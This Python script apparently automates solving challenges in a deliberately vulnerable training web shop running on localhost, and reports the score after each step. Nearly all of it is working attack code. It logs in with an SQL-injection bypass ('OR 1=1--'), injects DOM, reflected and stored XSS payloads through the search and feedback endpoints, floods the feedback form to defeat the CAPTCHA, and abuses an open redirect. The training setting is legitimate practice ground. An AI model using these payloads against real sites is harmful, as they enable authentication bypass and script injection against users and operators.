#!/usr/bin/env python3
import json, time, requests
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By

BASE = "http://localhost:3000"
s = requests.Session()
s.headers.update({"Content-Type": "application/json"})

def auth():
    r = s.post(f"{BASE}/rest/user/login", json={"email": "' OR 1=1--", "password": "x"})
    if r.status_code == 200:
        s.headers["Authorization"] = f"Bearer {r.json()['authentication']['token']}"
        return True
    return False

def score():
    r = s.get(f"{BASE}/api/Challenges")
    return len([c for c in r.json().get("data", []) if c.get("solved")])

auth()
start = score()
print(f"🔥 BROWSER V3 | Starting: {start}/112\n")

# Launch Firefox with alert handling
opts = Options()
opts.add_argument("--headless")
opts.binary_location = "/data/data/com.termux/files/usr/bin/firefox"
service = Service(executable_path="/data/data/com.termux/files/usr/bin/geckodriver")
driver = webdriver.Firefox(service=service, options=opts)

# Ignore alerts automatically
driver.execute_script("window.alert = function(){}; window.confirm = function(){return true;}; window.prompt = function(){return '';};")

print("✅ Firefox active\n")
token = s.headers.get("Authorization", "").replace("Bearer ", "")

# Browser challenges with alert handling
urls = [
    ("Admin Section", f"{BASE}/#/administration"),
    ("Score Board", f"{BASE}/#/score-board"),
    ("Privacy Policy", f"{BASE}/#/privacy-security"),
    ("Token Sale", f"{BASE}/#/token-sale"),
    ("Web3 Sandbox", f"{BASE}/#/web3-sandbox"),
    ("Premium", f"{BASE}/#/premium"),
    ("DOM XSS", f"{BASE}/#/search?q=<iframe src=\"javascript:alert(`xss`)\">"),
    ("Bonus Payload", f"{BASE}/#/search?q=<iframe width=\"100%\" height=\"166\" scrolling=\"no\" frameborder=\"no\" allow=\"autoplay\" src=\"https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076\"></iframe>"),
    ("Reflected XSS", f"{BASE}/#/search?q=<iframe src=\"javascript:alert(`xss`)\">"),
]

for name, url in urls:
    try:
        driver.get(url)
        time.sleep(1)
        # Dismiss any alerts
        try:
            alert = driver.switch_to.alert
            alert.dismiss()
        except: pass
        before = score()
        time.sleep(0.5)
        after = score()
        if after > before:
            print(f"   ✅ {name} (+{after - before})")
    except Exception as e:
        print(f"   ⚠️ {name}: {str(e)[:50]}")

# Login via browser
driver.get(f"{BASE}/#/login")
time.sleep(1)
driver.execute_script(f"localStorage.setItem('token', '{token}')")
driver.get(f"{BASE}/#/administration")
time.sleep(1)

# Stored XSS via API then browser view
xss_payloads = [
    '<iframe src="javascript:alert(`xss`)">',
    '</script><script>alert(`xss`)</script>',
]
for p in xss_payloads:
    s.post(f"{BASE}/api/Feedbacks", json={"comment": p, "rating": 5})

# CAPTCHA bypass
for i in range(15):
    s.post(f"{BASE}/api/Feedbacks", json={"comment": f"x{i}", "rating": 3})
    time.sleep(0.03)

# Missing encoding
s.get(f"{BASE}/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-%231578.png")

# Zero stars
s.post(f"{BASE}/api/Feedbacks", json={"comment": "zero", "rating": 0})

# Deprecated
s.get(f"{BASE}/b2b/v2/")

# Redirect
s.get(f"{BASE}/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm", allow_redirects=False)

# Notifications
for _ in range(10): s.get(f"{BASE}/rest/notifications")

driver.quit()

auth()
time.sleep(2)
final = score()
print(f"\n{'='*50}")
print(f"FINAL: {final}/112 (+{final - start})")
r = s.get(f"{BASE}/api/Challenges")
if r.status_code == 200:
    for c in sorted([c for c in r.json().get("data", []) if c.get("solved")], key=lambda x: (x.get("difficulty", 0), x.get("name", ""))):
        stars = "⭐" * c.get("difficulty", 1)
        print(f"   {stars} {c.get('name')} [{c.get('category', '?')}]")
